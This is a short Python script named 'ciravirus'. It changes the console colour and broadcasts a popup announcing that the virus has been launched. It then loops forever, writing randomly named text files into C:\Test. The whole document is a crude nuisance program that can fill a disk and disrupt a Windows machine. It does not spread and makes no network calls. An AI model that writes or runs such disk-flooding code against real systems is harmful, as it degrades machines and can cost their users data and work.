import os
import random

os.system("color 0a")
os.system("msg * You have just launched ciravirus {}".format(random.randint(0, 9999)))

while True:
    file_name = str(random.randint(0, 9999)) + str(random.randint(0, 9999)) + ".txt"
    file_path = os.path.join("C:\\Test", file_name)
    with open(file_path, 'w') as file:
        file.write("This is ciravirus #{}".format(random.randint(0, 9999)))
